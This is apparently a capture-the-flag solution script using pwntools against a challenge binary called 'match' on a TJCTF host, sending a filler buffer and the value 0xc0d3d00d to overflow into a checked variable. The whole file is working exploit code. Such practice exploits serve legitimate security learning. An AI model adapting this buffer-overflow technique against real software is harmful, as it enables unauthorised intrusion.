from pwn import *

if 'rem' in sys.argv:
    r = remote('p1.tjctf.org', 8002)
elif 'file' in sys.argv:
    class getPayload:
        def __init__(self):
            self.payload = b''
        def send(self, oper):
            self.payload += oper
        def interactive(self):
            file = open('payload', 'wb')
            file.write(self.payload)
            file.close()
    r = getPayload()
else:
    r = process('./match')

for i in range(3):
    r.send(b'a\n')

filler = b'B9alaLbY4e2rTxuWlzHbzvk7K8bKD08bpJrNsivp1AxxTcz9lCCiN3TFMLjH09rcQe5RQfp0CynfYbfZIiKjutBC7R0fkkcd5a2t0XhsBt2d7BxNN6qT'

r.send(filler)
r.send(p32(0xc0d3d00d))
r.send(b'\n')

r.interactive()
